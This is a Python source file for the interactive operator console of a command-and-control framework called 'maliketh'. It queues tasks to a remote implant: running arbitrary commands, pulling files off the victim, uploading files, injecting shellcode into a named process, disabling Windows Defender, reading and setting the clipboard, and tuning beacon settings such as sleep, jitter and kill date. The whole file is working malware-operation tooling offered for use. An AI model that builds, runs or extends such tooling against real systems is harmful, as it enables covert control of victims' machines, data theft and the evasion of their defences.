import base64
import datetime
import os
from typing import Any, List, Optional, Tuple
from prompt_toolkit import print_formatted_text, HTML, PromptSession
from prompt_toolkit.shortcuts import prompt
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style
from tabulate import tabulate

from cli.help import INTERACT_ENTRIES, get_help_entry, print_help
from cli.style import TABULATE_STYLE

from .style import PROMPT_STYLE
from config import OperatorConfig
from .completer import InteractCompleter, get_interact_dynamic_completer
from .commands import INTERACT_COMMANDS, COMMANDS, walk_dict
from comms import (
    add_task,
    get_implant_profile,
    get_task_result,
    kill_implant,
    update_implant_profile,
)
from opcodes import Opcodes
import structlog

logger = structlog.get_logger()


def interact_prompt(config: OperatorConfig, implant_id: str):
    from .cli import bottom_bar

    session = PromptSession(
        message=HTML(
            f"<warning>maliketh</warning> (<home>{config.name}</home>) - <interact>{implant_id[0:8]}</interact> > "
        ),
        style=PROMPT_STYLE,
        enable_history_search=True,
        completer=get_interact_dynamic_completer(config, implant_id),
        bottom_toolbar=bottom_bar(config),
        auto_suggest=AutoSuggestFromHistory(),
    )

    while True:
        try:
            text = session.prompt()
            cmd, *args = text.split(" ")
            if handle(cmd, args, config, implant_id):
                break
        except KeyboardInterrupt:
            continue
        except EOFError:
            break


def handle(
    cmd: str, args: List[str], config: OperatorConfig, implant_id: str
) -> None | bool:
    """
    Handle a command
    """
    if cmd in ["help", "h", "?"]:
        handle_help(args)
    elif cmd == "exit":
        handle_exit(config)
    elif cmd == "cmd":
        handle_cmd(config, implant_id, args)
    elif cmd == "config":
        handle_config(config, implant_id, args)
    elif cmd == "selfdestruct":
        handle_selfdestruct(config, implant_id)
        return True
    elif cmd == "sysinfo":
        handle_sysinfo(config, implant_id)
    elif cmd == "result" or cmd == "results":
        handle_result(config, args)
    elif cmd == "sleep":
        handle_sleep(config, implant_id, args)
    elif cmd == "download":
        handle_download(config, implant_id, args)
    elif cmd == "upload":
        handle_upload(config, implant_id, args)
    elif cmd == "inject":
        handle_inject(config, implant_id, args)
    elif cmd in ["cd", "chdir"]:
        handle_cd(config, implant_id, args)
    elif cmd == "pwd":
        handle_pwd(config, implant_id)
    elif cmd == "getenv":
        handle_getenv(config, implant_id)
    elif cmd == "ls":
        handle_ls(config, implant_id, args)
    elif cmd == "ps":
        handle_ps(config, implant_id)
    elif cmd == "whoami":
        handle_whoami(config, implant_id)
    elif cmd == "disable_defender":
        handle_disable_defender(config, implant_id)
    elif cmd == "clipboard":
        handle_clipboard(config, implant_id, args)
    elif cmd == "back":
        return True
    elif cmd == "clear":
        print("\033[H\033[J")
    elif cmd.strip() == "":
        pass
    else:
        logger.error(f"Command {cmd} not found")


def handle_help(args: List[str]) -> None:
    """
    Handle the help command
    """
    if len(args) == 0:
        print("Available commands:\n")
        print_help(entries=INTERACT_ENTRIES)
        print()
    else:
        entry = get_help_entry(args, INTERACT_ENTRIES)
        if entry is None:
            logger.error(f"Command '{' '.join(args)}' not found")
        else:
            print(entry.long_str())


def handle_exit(config: OperatorConfig) -> None:
    """
    Handle the exit command, jump back to the main loop
    """
    from .cli import main_loop

    main_loop(config)


def handle_cmd(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
    """
    Handle the cmd command, send a command to the implant
    """
    if len(args) < 1:
        logger.error("Please provide a command to send")
        return

    # logger.info(f"Sending command `{' '.join(args)}` to {implant_id}")
    # logger.info("Sending command `%s` to %s", " ".join(args), implant_id)
    logger.info("Sending command")
    add_task(config, Opcodes.CMD.value, implant_id, args)


def handle_config(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
    if len(args) < 2:
        logger.error("Please provide an action to perform and a key")
        return
    action, key = args[0], args[1]
    changes = {}
    valid_keys = [k.split(" ")[0] for k in INTERACT_COMMANDS["config"]["set"].keys()]

    if action == "set":
        if len(args) < 3:
            logger.error("Please provide a key and value to set")
            return
        value = args[2]
        if key in valid_keys:
            valid, typed_value = validate_config_set(key, value)
            if valid:
                changes[key] = typed_value
                logger.info(f"Setting `{key}` to `{value}`")
                update_implant_profile(config, implant_id, changes)
        else:
            logger.error(f"Invalid key `{key}`")
    elif action == "show":
        if len(args) < 2:
            logger.error("Please provide a key to show")
            return
        implant_config = get_implant_profile(config, implant_id)
        if key == "all":
            print(
                tabulate(
                    implant_config.items(),
                    headers=["Key", "Value"],
                    tablefmt=TABULATE_STYLE,
                )
            )
        elif key in INTERACT_COMMANDS["config"]["show"]:
            print(
                tabulate(
                    [[key, implant_config[key]]],
                    headers=["Key", "Value"],
                    tablefmt=TABULATE_STYLE,
                )
            )
        else:
            logger.error(f"Invalid key {key}")
    else:
        logger.error("Invalid action, must be set or show")
        return


def handle_selfdestruct(config: OperatorConfig, implant_id: str) -> None:
    """
    Handle the selfdestruct command, send a selfdestruct task to the implant
    """
    logger.debug(f"Sending selfdestruct task to {implant_id}")
    kill_implant(config, implant_id)


################################
## Helper functions
################################


def validate_config_set(key: str, value: str) -> Tuple[bool, Any]:
    if key == "user_agent":
        return True, value
    elif key == "sleep_time":
        if value.isdigit():
            return True, int(value)
        else:
            logger.error("Sleep time must be an integer")
            return False, None
    elif key == "kill_date":
        try:
            return True, datetime.datetime.strptime(value, "%Y-%m-%d")
        except ValueError:
            logger.error("Kill date must be in the format YYYY-MM-DD")
            return False, None
    elif key == "jitter":
        # Check if jitter is a float
        try:
            return True, float(value)
        except ValueError:
            logger.error("Jitter must be a float")
            return False, None
    elif key == "max_retries":
        if value.isdigit():
            return True, int(value)
        else:
            logger.error("Max retries must be an integer")
            return False, None
    elif key == "auto_self_destruct":
        try:
            return True, bool(value)
        except ValueError:
            logger.error("Auto self destruct must be a boolean")
            return False, None
    elif key == "retry_wait":
        try:
            return True, int(value)
        except ValueError:
            logger.error("Retry wait must be an int")
            return False, None
    elif key == "retry_jitter":
        try:
            return True, float(value)
        except ValueError:
            logger.error("Retry jitter must be a float")
            return False, None
    elif key == "tailoring_hash_function":
        if value in ["sha256", "md5"]:
            return True, value
    elif key == "tailoring_hash_rounds":
        if value.isdigit() and int(value) > 0:
            return True, int(value)
        else:
            logger.error("Tailoring hash rounds must be a positive integer")
            return False, None
    else:
        logger.error(f"Invalid key {key}")
        return False, None

    return False, None


def handle_sysinfo(config: OperatorConfig, implant_id: str) -> None:
    """
    Handle the sysinfo command, send a sysinfo task to the implant
    """
    logger.debug(f"Sending sysinfo task to {implant_id}")
    add_task(config, Opcodes.SYSINFO.value, implant_id, [])


def handle_result(config: OperatorConfig, args: List[str]) -> None:
    """
    Handle the result command, get the results of a task
    """
    from .command import handle_result

    handle_result(config, args)


def handle_sleep(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
    """
    Handle the sleep command, send a sleep task to the implant
    """
    if len(args) < 1:
        logger.error("Please provide a number of seconds to sleep")
        return

    if not args[0].isdigit():
        logger.error("Sleep time must be an integer")
        return

    seconds = args[0]
    logger.debug(f"Sending sleep task to {implant_id}")
    add_task(config, Opcodes.SLEEP.value, implant_id, int(seconds))


def handle_download(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
    """
    Handle the download command, send a download task to the implant.
    This task DOWNLOADs a file FROM the implant TO the operator/server
    """
    if len(args) < 1:
        logger.error("Please provide a file path to download")
        return

    path = args[0]
    logger.debug(f"Sending download task to {implant_id}")
    add_task(config, Opcodes.DOWNLOAD.value, implant_id, path)


def handle_upload(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
    """
    Handle the upload command, send an upload task to the implant
    """
    if len(args) < 2:
        logger.error("Please provide a remote and local file path")
        return

    local_path = args[0]
    remote_path = args[1]

    # See if file exists and is not a directory
    if not os.path.isfile(local_path):
        logger.error(f"File {local_path} does not exist")
        return

    # Encode file contents as base64
    with open(local_path, "rb") as f:
        file_contents = base64.b64encode(f.read()).decode()

    logger.debug(f"Sending upload task to {implant_id}")
    add_task(config, Opcodes.UPLOAD.value, implant_id, [remote_path, file_contents])


def handle_inject(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
    """
    Handle the inject command, send an inject task to the implant
    """
    if len(args) < 2:
        logger.error("Please provide a file path and a process name to inject")
        return

    logger.warning(f"Injecting raw shellcode can be unstable. Use at your own risk.")

    file_path = args[0]
    process_name = args[1]

    if not os.path.isfile(file_path):
        logger.error(f"File {file_path} does not exist")
        return

    # Read file bytes
    with open(file_path, "rb") as f:
        file_contents = base64.b64encode(f.read()).decode()

    logger.debug(f"Sending inject task to {implant_id}")
    add_task(config, Opcodes.INJECT.value, implant_id, [file_contents, process_name])


def handle_cd(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
    """
    Handle the cd command, send a cd task to the implant
    """
    if len(args) < 1:
        logger.error("Please provide a directory to change to")
        return

    directory = args[0]
    logger.debug(f"Sending cd task to {implant_id}")
    add_task(config, Opcodes.CHDIR.value, implant_id, directory)


def handle_ls(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
    """
    Handle the ls command, send an ls task to the implant
    """
    if len(args) < 1:
        logger.error("Please provide a directory to list")
        return

    logger.debug(f"Sending ls task to {implant_id}")
    add_task(config, Opcodes.LS.value, implant_id, None)


def handle_pwd(config: OperatorConfig, implant_id: str) -> None:
    """
    Handle the pwd command, send a pwd task to the implant
    """
    logger.debug(f"Sending pwd task to {implant_id}")
    add_task(config, Opcodes.PWD.value, implant_id, None)


def handle_ls(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
    """
    Handle the ls command, send an ls task to the implant
    """
    logger.debug(f"Sending ls task to {implant_id}")
    add_task(config, Opcodes.LS.value, implant_id, None)


def handle_getenv(config: OperatorConfig, implant_id: str) -> None:
    """
    Handle the getenv command, send a getenv task to the implant
    """
    logger.debug(f"Sending getenv task to {implant_id}")
    add_task(config, Opcodes.GETENV.value, implant_id, None)


def handle_ps(config: OperatorConfig, implant_id: str) -> None:
    """
    Handle the ps command, send a ps task to the implant
    """
    logger.debug(f"Sending ps task to {implant_id}")
    add_task(config, Opcodes.PS.value, implant_id, None)


def handle_whoami(config: OperatorConfig, implant_id: str) -> None:
    """
    Handle the whoami command, send a whoami task to the implant
    """
    logger.debug(f"Sending whoami task to {implant_id}")
    add_task(config, Opcodes.WHOAMI.value, implant_id, None)


def handle_disable_defender(config: OperatorConfig, implant_id: str) -> None:
    """
    Handle the `disable_defender` command
    """
    logger.debug(f"Sending disable_defender task to {implant_id}")
    add_task(config, Opcodes.DISABLE_DEFENDER.value, implant_id, None)

def handle_clipboard(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
    """
    Handle the clipboard command
    """
    if len(args) < 1:
        logger.error("Please provide an action to perform")
        return

    action = args[0]
    if action == "get":
        logger.debug(f"Sending clipboard_get task to {implant_id}")
        add_task(config, Opcodes.CLIPBOARD_GET.value, implant_id, None)
    elif action == "set":
        if len(args) < 2:
            logger.error("Please provide text to set the clipboard to")
            return

        text = args[1]
        logger.debug(f"Sending clipboard_set task to {implant_id}")
        add_task(config, Opcodes.CLIPBOARD_SET.value, implant_id, text)
    else:
        logger.error(f"Invalid action {action}")
        return